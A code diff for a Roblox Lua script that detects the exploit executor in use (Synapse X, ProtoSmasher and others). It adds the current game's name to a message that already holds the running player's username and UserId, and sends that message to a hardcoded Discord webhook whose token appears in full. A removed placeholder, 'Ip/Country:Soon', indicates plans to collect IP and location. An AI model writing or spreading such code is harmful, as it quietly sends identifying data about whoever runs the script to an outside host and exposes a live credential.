@@ -1,4 +1,5 @@
 local plr = game:GetService("Players").LocalPlayer
+local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
 
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -10,7 +11,7 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1214579523874717776/rknNrO1JIH7jqyuS3mVYH1qUZ-f13o8OM0PcHu76jBuktuTNcXelyq7Pju1bfGMIbBYT"
 local data = {
-   ["content"] = "Username: " .. plr.Name .. "\nUserId: " .. plr.UserId .. "\nIp/Country:Soon",
+   ["content"] = "Username: " .. plr.Name .. "\nUserId: " .. plr.UserId .. "game: " .. GetName.Name,
  
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)
